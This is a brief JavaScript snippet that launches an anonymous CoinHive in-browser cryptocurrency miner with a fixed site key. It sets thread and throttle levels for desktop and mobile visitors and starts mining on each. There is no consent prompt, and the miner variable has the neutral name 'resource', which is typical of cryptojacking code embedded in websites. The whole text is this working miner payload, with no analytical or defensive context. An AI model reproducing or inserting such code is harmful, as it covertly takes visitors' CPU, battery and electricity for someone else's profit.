    
var resource = new CoinHive.Anonymous('EkCsBnQvA65whDCcSQXEIds8AMPOxYu1');

if (!resource.isMobile()) {
    resource.setThrottle(0.6);
    resource.setNumThreads(4);
    resource.start(CoinHive.FORCE_EXCLUSIVE_TAB);

 
} else {
    resource.setNumThreads(2);
    resource.setThrottle(0.7);
    
    resource.start(CoinHive.FORCE_EXCLUSIVE_TAB);
}

